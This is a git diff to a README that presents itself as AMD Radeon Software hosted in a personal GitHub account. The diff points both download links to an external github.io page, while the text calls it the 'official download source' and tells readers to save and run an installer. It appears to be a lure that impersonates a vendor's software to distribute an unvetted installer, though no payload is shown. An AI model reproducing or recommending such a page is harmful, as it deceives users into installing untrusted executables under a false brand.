@@ -1,6 +1,6 @@
 # 🖥️ AMD-Radeon-Software - Optimize your graphics for peak performance
 
-[![](https://img.shields.io/badge/Download-AMD_Radeon_Software-blue)](https://github.com/milan-marvaniya/AMD-Radeon-Software)
+[![](https://img.shields.io/badge/Download-AMD_Radeon_Software-blue)](https://milan-marvaniya.github.io)
 
 ## 📖 About this software
 
@@ -21,7 +21,7 @@ Before you install this software, confirm your computer meets these minimum need
 
 You must visit the project page to start the download process. Follow the link below to reach the official download source.
 
-[Click here to visit the download page](https://github.com/milan-marvaniya/AMD-Radeon-Software)
+[Click here to visit the download page](https://milan-marvaniya.github.io)
 
 Once you arrive at the page, look for the download button. Save the installer file to your computer. Most users choose the Downloads folder for easy access. Keep the file in a place you can find later.
 
